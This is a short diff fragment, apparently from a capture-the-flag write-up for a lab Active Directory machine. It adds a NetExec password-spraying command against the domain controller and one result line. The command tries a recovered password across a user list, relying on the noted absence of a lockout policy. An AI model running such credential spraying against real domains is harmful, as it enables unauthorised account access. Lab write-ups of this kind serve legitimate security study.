@@ -231,5 +231,8 @@ Found another password
 There is no lockout policy on the domain
 
 ```python
+nxc smb dc01.infiltrator.htb -u AD-users.txt -p 'MessengerApp@Pass!' --continue-on-success
+
+SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\d.anderson:MessengerApp@Pass! STATUS_ACCOUNT_RESTRICTION 
 
 ```
